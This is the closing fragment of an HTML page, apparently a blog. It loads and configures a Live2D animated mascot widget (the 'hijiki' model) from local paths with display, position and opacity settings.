<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":170,"height":340},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
